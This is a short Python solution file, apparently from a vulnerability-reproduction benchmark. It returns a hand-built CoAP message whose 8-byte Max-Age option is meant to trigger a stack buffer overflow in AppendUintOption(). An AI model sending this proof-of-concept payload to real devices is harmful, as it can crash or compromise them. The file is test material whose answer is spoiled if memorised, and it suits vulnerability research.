import os
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Best-effort lightweight use of src_path (not required for generating the PoC).
        try:
            if src_path and os.path.exists(src_path) and tarfile.is_tarfile(src_path):
                with tempfile.TemporaryDirectory() as td:
                    with tarfile.open(src_path, "r:*") as tf:
                        members = tf.getmembers()
                        if members:
                            tf.extract(members[0], path=td)
        except Exception:
            pass

        # CoAP message designed to drive a uint option (Max-Age, option number 14) with 8-byte value,
        # which can trigger the vulnerable AppendUintOption() stack buffer overflow.
        #
        # Header: ver=1, type=CON(0), tkl=4 => 0x44
        # Code: GET (0x01)
        # MID: 0x1234
        # Token: 4 bytes
        # Option: delta=14 (encoded as 13 + 1), length=8 => 0xD8 0x01 + 8 bytes value
        # Payload: 0xFF + 2 bytes
        return bytes([
            0x44, 0x01, 0x12, 0x34,
            0x41, 0x41, 0x41, 0x41,
            0xD8, 0x01,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0xFF, 0x41, 0x41
        ])